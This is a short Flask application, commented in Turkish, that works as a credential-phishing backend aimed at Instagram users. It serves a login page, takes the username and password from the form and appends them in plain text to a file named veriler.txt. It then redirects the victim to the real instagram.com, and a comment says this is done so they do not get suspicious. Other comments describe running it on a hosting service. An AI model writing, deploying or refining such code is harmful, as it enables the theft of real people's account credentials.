from flask import Flask, render_template, request, redirect
import os

app = Flask(__name__)

# 1. Ana sayfa: index.html dosyasını kullanıcıya gösterir
@app.route('/')
def ana_sayfa():
    return render_template('index.html')

# 2. Kayıt işlemi: Formdan gelen verileri yakalar
@app.route('/kayit', methods=['POST'])
def verileri_al():
    # HTML'deki name="username" ve name="password" alanlarından veriyi çeker
    kullanici = request.form.get('username')
    sifre = request.form.get('password')

    # Verileri dosyaya kaydeder (Her yeni girişi alt alta ekler)
    try:
        with open("veriler.txt", "a", encoding="utf-8") as dosya:
            dosya.write(f"Hesap: {kullanici} | Sifre: {sifre}\n")
            dosya.write("-" * 30 + "\n")
    except Exception as e:
        print(f"Dosya yazma hatası: {e}")

    # İşlem bitince kullanıcıyı şüphelenmemesi için gerçek Instagram'a atar
    return redirect("https://www.instagram.com")

# 3. Çalıştırma ayarı: Hem kendi bilgisayarında hem sunucuda çalışmasını sağlar
if __name__ == '__main__':
    # Sunucu (Render vb.) tarafından verilen portu kullan, yoksa 5000 portunda aç
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=True)